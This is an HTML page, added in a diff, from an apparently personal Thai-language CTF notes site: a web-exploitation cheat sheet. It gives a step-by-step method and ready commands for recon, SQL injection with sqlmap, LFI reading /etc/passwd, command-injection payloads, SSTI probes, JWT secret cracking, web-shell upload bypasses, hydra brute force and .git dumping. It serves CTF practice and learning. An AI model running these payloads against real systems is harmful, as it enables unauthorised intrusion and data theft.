@@ -1,0 +1,316 @@
+<!doctype html>
+<html lang="th" data-theme="light">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Web Cheatsheet · Personal Notes</title>
+<meta name="description" content="ลำดับคิด 8 ขั้น + ชนิดช่องโหว่ + เคสจาก writeup">
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<div class="wrap">
+  <aside class="sidebar">
+    <a class="brand" href="../index.html">
+      <span class="logo">PN</span>
+      <span><b>Personal Notes</b><small>Cheat sheets · Automation · Tools</small></span>
+    </a>
+    <nav class="nav">
+<a href="../index.html"><span class="ico">🏠</span> หน้าแรก</a>
+<div class="nav-group">
+<div class="label">📌 เริ่มต้น</div>
+<a class="sub" href="../overview.html">ภาพรวมทั้งหมด</a>
+</div>
+<div class="nav-group">
+<div class="label">🚀 Automation</div>
+<a class="sub" href="../Automation/automation_guide.html">Automation — หา Flag ด้วยคำสั่งเดียว</a>
+</div>
+<div class="nav-group">
+<div class="label">🔐 Crypto</div>
+<a class="sub" href="../Crypto/crypto_cheatsheet.html">Crypto Cheatsheet</a>
+</div>
+<div class="nav-group">
+<div class="label">🧪 Forensics</div>
+<a class="sub" href="../Forensics/file_signatures.html">File Signatures</a>
+<a class="sub" href="../Forensics/binwalk_commands.html">binwalk &amp; Carving</a>
+<a class="sub" href="../Forensics/strings_commands.html">strings</a>
+<a class="sub" href="../Forensics/metadata.html">Metadata</a>
+</div>
+<div class="nav-group">
+<div class="label">🌐 Web</div>
+<a class="sub active" href="../Web/web_cheatsheet.html">Web Cheatsheet</a>
+<a class="sub" href="../Web/common_payloads.html">Common Payloads</a>
+<a class="sub" href="../Web/commands.html">Web Commands</a>
+</div>
+<div class="nav-group">
+<div class="label">🧩 Reverse</div>
+<a class="sub" href="../Reverse/reversing_notes.html">Reversing Notes</a>
+<a class="sub" href="../Reverse/common_commands.html">Reverse Commands</a>
+</div>
+<div class="nav-group">
+<div class="label">🔍 OSINT</div>
+<a class="sub" href="../OSINT/methodology.html">OSINT Methodology</a>
+</div>
+<div class="nav-group">
+<div class="label">🧰 Misc</div>
+<a class="sub" href="../Misc/useful_commands.html">Useful Commands</a>
+</div>
+<div class="nav-group"><div class="label">🔎 ค้นหา</div><a class="sub" href="../tools.html">Tools Index</a><a class="sub" href="../index.html#search">ค้นหาทั้งหมด</a></div>
+    </nav>
+  </aside>
+  <div class="main">
+    <header class="topbar">
+      <button class="icon-btn menu-btn" id="menu-btn" aria-label="เมนู">☰</button>
+      <div class="crumb">🌐 Web / <b>Web Cheatsheet</b></div>
+      <button class="icon-btn" id="theme-btn" aria-label="ธีม">🌙</button>
+    </header>
+    <main class="content">
+<div class="toolrow"><a href="../tools.html#curl">curl</a><a href="../tools.html#burp">Burp</a><a href="../tools.html#ffuf">ffuf</a><a href="../tools.html#feroxbuster">feroxbuster</a><a href="../tools.html#gobuster">gobuster</a><a href="../tools.html#katana">katana</a><a href="../tools.html#sqlmap">sqlmap</a><a href="../tools.html#jwt_tool">jwt_tool</a><a href="../tools.html#nmap">nmap</a><a href="../tools.html#hydra">hydra</a></div>
+<h1 id="web-cheatsheet">Web Cheatsheet — แนวคิดและลำดับการแก้โจทย์เว็บ</h1>
+<blockquote>
+<p>ใช้เมื่อ: โจทย์ให้ URL มา (เช่น <code>http://target:8080</code>)
+เครื่องมือที่อนุญาต: <code>curl</code>, <code>Burp Suite CE</code>, <code>ffuf</code>, <code>feroxbuster</code>, <code>gobuster</code>, <code>katana</code>, <code>sqlmap</code>, <code>jwt_tool</code>, <code>nmap</code>, <code>hydra</code>, <code>CyberChef</code>
+<strong>ห้าม</strong>: <code>dirsearch</code> (อยู่ใน Unapproved List) — ใช้ <code>ffuf</code> / <code>feroxbuster</code> / <code>gobuster</code> แทน</p>
+</blockquote>
+<hr />
+<h2 id="0">0) ลำดับการทำงาน (ทำตามนี้ทีละขั้น)</h2>
+<pre><code>1. เปิดเว็บด้วยตา (Chrome)          -&gt; เห็นอะไร? มีฟอร์มอะไร? มี hint ไหม?
+2. curl -i                          -&gt; header, cookie, framework
+3. ดู source + comment + JS         -&gt; บางที flag อยู่ในคอมเมนต์
+4. robots.txt / sitemap.xml         -&gt; path ที่ซ่อน
+5. ffuf / feroxbuster               -&gt; หา /admin /backup /flag
+6. เจอช่องกรอก -&gt; ทดสอบตามชนิด:
+      login        -&gt; SQLi / NoSQLi / weak creds
+      search       -&gt; SQLi / SSTI / XSS
+      file=        -&gt; LFI / path traversal
+      url=         -&gt; SSRF
+      upload       -&gt; bypass extension
+      ping/host=   -&gt; command injection
+7. ได้ token/cookie -&gt; ถอด JWT (jwt_tool)
+8. ยังไม่ออก -&gt; ดู ../Web/common_payloads.md
+</code></pre>
+<hr />
+<h2 id="1-curl">1) ขั้นแรก: ดูด้วยตา + curl</h2>
+<pre><code class="language-bash"># header ทั้งหมด (ดู Server, X-Powered-By, Set-Cookie)
+curl -i http://target:8080/
+
+# ตาม redirect + เก็บ cookie
+curl -i -L -c cookies.txt http://target:8080/
+
+# ใช้ cookie ที่มี
+curl -b cookies.txt http://target:8080/admin
+
+# ดูว่า status เป็นอะไร (ไม่ต้องโหลด body)
+curl -s -o /dev/null -w '%{http_code} %{size_download}\n' http://target:8080/admin
+</code></pre>
+<p><strong>สิ่งที่ต้องดูใน header:</strong></p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>header</th>
+<th>บอกอะไร</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Server: nginx/1.18</code></td>
+<td>เว็บเซิร์ฟเวอร์ (ช่องโหว่ตามเวอร์ชัน)</td>
+</tr>
+<tr>
+<td><code>X-Powered-By: PHP/8.1</code></td>
+<td>ภาษา (PHP → LFI/deserialization)</td>
+</tr>
+<tr>
+<td><code>Set-Cookie: session=...</code></td>
+<td>อาจเป็น JWT / base64 / flask session</td>
+</tr>
+<tr>
+<td><code>Location:</code></td>
+<td>redirect ไปที่ซ่อน</td>
+</tr>
+<tr>
+<td><code>Access-Control-Allow-Origin: *</code></td>
+<td>CORS เปิด (อาจดึงข้อมูลข้ามโดเมน)</td>
+</tr>
+</tbody>
+</table></div>
+<hr />
+<h2 id="2-path">2) หา path ที่ซ่อน</h2>
+<pre><code class="language-bash"># ffuf (เร็วสุด)
+ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+     -mc 200,204,301,302,401,403 -t 40
+
+# feroxbuster (ไล่ต่ออัตโนมัติ)
+feroxbuster -u http://target -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+
+# gobuster
+gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -s 200,301,302,403
+
+# katana (crawler — เก็บ link ทั้งเว็บ)
+katana -u http://target -d 3 -o urls.txt
+</code></pre>
+<p><strong>path ที่ต้องลองด้วยมือเสมอ:</strong></p>
+<pre><code>/robots.txt   /sitemap.xml   /.git/HEAD   /.env   /backup.zip
+/admin/       /flag          /flag.txt    /debug  /console
+/api/         /api/v1/       /swagger      /phpinfo.php
+</code></pre>
+<pre><code class="language-bash">for p in robots.txt sitemap.xml .git/HEAD .env backup.zip admin/ flag flag.txt debug; do
+  printf '%-15s ' &quot;$p&quot;
+  curl -s -o /dev/null -w '%{http_code}\n' &quot;http://target/$p&quot;
+done
+</code></pre>
+<hr />
+<h2 id="3">3) ชนิดช่องโหว่ → วิธีทดสอบเร็ว</h2>
+<h3 id="31-sql-injection">3.1 SQL Injection</h3>
+<pre><code class="language-bash"># ตรวจว่ามีช่องโหว่ไหม (error-based)
+curl -s &quot;http://target/item.php?id=1'&quot;
+curl -s &quot;http://target/item.php?id=1%20AND%201=2&quot;
+
+# ให้ sqlmap ทำงานแทน (อ่านง่าย ปลอดภัยกว่าเดา)
+sqlmap -u &quot;http://target/item.php?id=1&quot; --batch --dbs
+sqlmap -u &quot;http://target/item.php?id=1&quot; --batch -D &lt;db&gt; --tables
+sqlmap -u &quot;http://target/item.php?id=1&quot; --batch -D &lt;db&gt; -T &lt;table&gt; --dump
+
+# login form (POST)
+sqlmap -u &quot;http://target/login.php&quot; --data=&quot;user=a&amp;pass=b&quot; --batch --dbs
+</code></pre>
+<h3 id="32-lfi-path-traversal">3.2 LFI / Path Traversal</h3>
+<pre><code class="language-bash">curl -s &quot;http://target/index.php?page=../../../../etc/passwd&quot;
+curl -s &quot;http://target/index.php?page=php://filter/convert.base64-encode/resource=index.php&quot; | base64 -d
+</code></pre>
+<h3 id="33-command-injection">3.3 Command Injection</h3>
+<pre><code class="language-bash">curl -s &quot;http://target/ping.php?ip=127.0.0.1;id&quot;
+curl -s &quot;http://target/ping.php?ip=127.0.0.1|whoami&quot;
+curl -s &quot;http://target/ping.php?ip=127.0.0.1\$(cat%20/flag)&quot;
+</code></pre>
+<h3 id="34-ssti-template-injection">3.4 SSTI (template injection)</h3>
+<pre><code class="language-bash">curl -s &quot;http://target/?name={{7*7}}&quot;        # ถ้าได้ 49 = มีช่องโหว่
+curl -s &quot;http://target/?name={{config}}&quot;
+</code></pre>
+<h3 id="35-jwt">3.5 JWT</h3>
+<pre><code class="language-bash">jwt_tool &lt;token&gt;                              # ถอด + ตรวจจุดอ่อน
+jwt_tool &lt;token&gt; -T                            # โหมดแก้ token (แก้ payload)
+jwt_tool &lt;token&gt; -C -d /usr/share/wordlists/rockyou.txt   # crack secret
+</code></pre>
+<h3 id="36-upload-file">3.6 Upload file</h3>
+<pre><code class="language-bash">curl -F &quot;file=@shell.php&quot; http://target/upload.php
+# ถ้าโดนบล็อกนามสกุล ลอง: shell.php5 .phtml .phar .PHP .php.jpg
+</code></pre>
+<hr />
+<h2 id="4-writeup">4) เทคนิคจาก writeup จริง</h2>
+<h3 id="41-ping-pwn-web-command-injection">4.1 "ping pwn" (Web / Command Injection)</h3>
+<p>โจทย์ให้หน้าเว็บที่ทำ ping — จุดอ่อนคือเอา input ไปต่อในคำสั่ง shell ตรง ๆ</p>
+<pre><code class="language-bash">curl &quot;http://target/ping.php?ip=127.0.0.1;cat%20/flag.txt&quot;
+</code></pre>
+<h3 id="42-n1-man-in-the-flag-networkweb-s3-presigned-url">4.2 "N1: Man in the flag" (Network/Web — S3 presigned URL)</h3>
+<p>โจทย์ให้ pcap ที่มี request ไป S3 — ต้องเห็น header ที่ใช้เข้ารหัสฝั่งลูกค้า</p>
+<pre><code class="language-bash">curl -H 'x-amz-server-side-encryption-customer-algorithm: AES256' \
+     -H 'x-amz-server-side-encryption-customer-key: &lt;key&gt;' \
+     -H 'x-amz-server-side-encryption-customer-key-MD5: &lt;md5&gt;' \
+     'https://&lt;bucket&gt;.s3.amazonaws.com/&lt;object&gt;'
+</code></pre>
+<blockquote>
+<p>บทเรียน: <strong>header ที่แปลก ๆ ใน pcap</strong> คือเบาะแสว่าต้อง replay request ด้วย header เดียวกัน</p>
+</blockquote>
+<h3 id="43-web-file-viewer-web-lfi">4.3 "Web file viewer" (Web — LFI)</h3>
+<p>หน้าเว็บมี <code>?file=</code> → ลอง path traversal และ php filter (ดูข้อ 3.2)</p>
+<hr />
+<h2 id="5">5) อ่านซอร์สโค้ดเว็บ (สำคัญมาก)</h2>
+<pre><code class="language-bash">curl -s http://target/ | grep -i -E '&lt;!--|flag|todo|admin'
+curl -s http://target/static/app.js | head -100
+curl -s http://target/.git/HEAD           # ถ้าเปิด git ไว้ = ดึงซอร์สทั้งเว็บได้
+</code></pre>
+<p>ถ้าเจอ <code>.git/</code> ให้ dump ทั้ง repo:</p>
+<pre><code class="language-bash"># วิธีเร็ว: ใช้ git-dumper (ถ้ามี) หรือ curl ทีละไฟล์
+git clone http://target/.git/ repo 2&gt;/dev/null || echo &quot;ต้องดึงทีละไฟล์&quot;
+</code></pre>
+<p><strong>ภาษา PHP ที่เจอบ่อย:</strong></p>
+<pre><code class="language-php">&lt;?php
+  include($_GET['page']);        // LFI
+  system(&quot;ping &quot; . $_GET['ip']); // command injection
+  echo file_get_contents($file); // path traversal
+  unserialize($_COOKIE['x']);    // PHP deserialization
+?&gt;
+</code></pre>
+<hr />
+<h2 id="6-cookie-session">6) Cookie / Session</h2>
+<pre><code class="language-bash"># ดูคุกกี้ทั้งหมด
+curl -i http://target/ | grep -i set-cookie
+
+# Flask session (ขึ้นต้นด้วย eyJ... และมี . คั่น 3 ส่วน)
+python3 -c &quot;
+import base64,json,sys
+t=sys.argv[1].split('.')[1]
+print(json.loads(base64.urlsafe_b64decode(t+'===')))&quot; '&lt;token&gt;'
+
+# แก้ cookie แล้วส่งไปใหม่
+curl -b 'role=admin' http://target/dashboard
+</code></pre>
+<p>รายละเอียด JWT → <code>../Web/commands.md</code> หัวข้อ jwt_tool</p>
+<hr />
+<h2 id="7-api-json">7) ถ้าเป็น API (JSON)</h2>
+<pre><code class="language-bash">curl -s http://target/api/users | jq
+curl -s -X POST http://target/api/login -H 'Content-Type: application/json' \
+     -d '{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;}' | jq
+
+# ลอง method อื่น
+curl -s -X OPTIONS -i http://target/api/users
+curl -s -X PUT http://target/api/users/1 -d '{&quot;role&quot;:&quot;admin&quot;}'
+</code></pre>
+<hr />
+<h2 id="8">8) เครื่องมือเสริม</h2>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>งาน</th>
+<th>คำสั่ง</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>intercept/แก้ request</td>
+<td>เปิด <strong>Burp Suite CE</strong> → ตั้ง proxy 127.0.0.1:8080</td>
+</tr>
+<tr>
+<td>brute force login</td>
+<td><code>hydra -l admin -P rockyou.txt target http-post-form "/login:user=^USER^&amp;pass=^PASS^:F=invalid"</code></td>
+</tr>
+<tr>
+<td>สแกน port</td>
+<td><code>nmap -sV -p- target</code></td>
+</tr>
+<tr>
+<td>crawl ทั้งเว็บ</td>
+<td><code>katana -u http://target -d 3</code></td>
+</tr>
+<tr>
+<td>หา subdomain</td>
+<td><code>subfinder -d target.com</code></td>
+</tr>
+</tbody>
+</table></div>
+<hr />
+<h2 id="9-checklist">9) Checklist ก่อนบอกว่า "ทำไม่ได้"</h2>
+<ul>
+<li>[ ] ดู source code + comment ครบหรือยัง</li>
+<li>[ ] ลอง <code>robots.txt</code>, <code>.git/</code>, <code>.env</code>, <code>backup.zip</code> แล้วหรือยัง</li>
+<li>[ ] เปลี่ยน method (GET→POST→PUT) หรือยัง</li>
+<li>[ ] ใส่ header แปลก ๆ (<code>X-Forwarded-For: 127.0.0.1</code>, <code>X-Original-URL: /admin</code>) หรือยัง</li>
+<li>[ ] ดู cookie ว่าถอดได้ไหม (base64/JWT)</li>
+<li>[ ] ffuf ด้วย wordlist ใหญ่ขึ้นหรือยัง</li>
+<li>[ ] error message บอกอะไร (path, SQL, stack trace)</li>
+</ul>
+<hr />
+<h2 id="10">10) กฎในสนาม</h2>
+<ul>
+<li>ยิงเฉพาะ target ที่โจทย์ให้มา (IP/โดเมนในขอบเขต) เท่านั้น</li>
+<li>อย่าใช้ <code>--os-shell</code> หรือ destructive payload กับโจทย์ที่ไม่ต้องการ</li>
+<li>เก็บ log ทุกคำสั่ง (<code>script session.log</code>) เผื่อต้องเขียน writeup</li>
+</ul>
+<div class="pager"><a class="prev" href="../Forensics/metadata.html"><span>ก่อนหน้า</span>Metadata</a><a class="next" href="../Web/common_payloads.html"><span>ถัดไป</span>Common Payloads</a></div>
+      <div class="footer">แก้ไขเนื้อหาได้ที่ไฟล์ <code>Web/web_cheatsheet.md</code> แล้วรัน <code>python3 build.py</code> ใหม่ · หน้านี้สร้างแบบ static ไม่ต้องต่อเน็ต</div>
+    </main>
+  </div>
+</div>
+<script src="../assets/site.js"></script>
+</body>
+</html>
